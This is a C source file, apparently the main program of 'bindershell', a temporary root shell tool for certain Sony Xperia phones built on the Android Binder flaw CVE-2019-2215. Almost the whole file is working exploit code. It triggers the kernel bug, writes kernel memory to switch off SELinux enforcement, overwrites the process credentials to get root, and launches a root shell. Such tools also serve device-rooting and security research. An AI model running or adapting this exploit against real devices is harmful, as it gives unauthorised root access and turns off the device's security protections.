#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

#include <netinet/ip.h>

#include <sys/syscall.h>

#include <sys/mman.h>
#include <sys/uio.h>

#include <sys/resource.h>

#include <unistd.h>
#include <sys/types.h>
#include <string.h>

#include "getroot.h"
#include "sidtab.h"
#include "policydb.h"
#include "offsets.h"

#include <sys/wait.h>
#include <stdint.h>
#include "client.h"
#include "debug.h"

uint64_t opt_kaslr_slide;

int getroot(struct offsets* o, uint64_t current_task_addr)
{
	int ret = 1;
	void * __kernel task = (void *)current_task_addr;
	int zero = 0;

	sidtab = o->sidtab;
	policydb = o->policydb;

	if(o->selinux_enforcing)
		write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));

	if((ret = modify_task_cred_uc(task)))
		goto end;

	ret = 0;
end:
	return ret;
}

void reenable_selinux(struct offsets* o)
{
	int one = 1;

	if(o->selinux_enforcing)
		write_at_address_pipe(o->selinux_enforcing, &one, sizeof(one));
}

int cve_2019_2215_0x98(uint64_t *current_task_addr);

int main(int argc, char **argv)
{
	int ret = 1;
	struct offsets* o;
	int uid;
	uint64_t current_task_addr;

	PNFO("\nbindershell - temp root shell for xperia XZ1c/XZ1/XZp using CVE-2019-2215\n");
	PNFO("https://github.com/j4nn/renoshell/tree/CVE-2019-2215\n\n");

	if (cve_2019_2215_0x98(&current_task_addr) != 0) {
		PERR("cve_2019_2215_0x98() failed\n");
		return 1;
	}

	//if (client_curr_get_kaslr(&opt_kaslr_slide) == 0)
		PNFO("kaslr slide 0x%zx\n", opt_kaslr_slide);

	if(!(o = get_offsets(opt_kaslr_slide)))
		return 1;

	if (argc > 1 && strcmp(argv[1], "--reenable-selinux") == 0) {
		reenable_selinux(o);
		PNFO("selinux_enforcing set to 1\n");
		return 0;
	}

	ret = getroot(o, current_task_addr);
	if (ret)
		return ret;

	uid = getuid();

	if (uid == 0) {
		pid_t pid;
		PNFO("\ngot root, start shell...\n\n");
		pid = fork();
		switch (pid) {
		case 0:
			wait(&ret);
			break;
		case -1:
			PRNO("fork");
			ret = 1;
			break;
		default:
			argv[0] = "/system/bin/sh";
			argv[argc] = NULL;
			ret = execv(argv[0], argv);
			PRNO("execv returns ret=%d\n", ret);
			ret = 1;
			break;
		}
	} else {
		PNFO("did not get root, uid=%d\n", uid);
		ret = 1;
	}

	return ret;
}
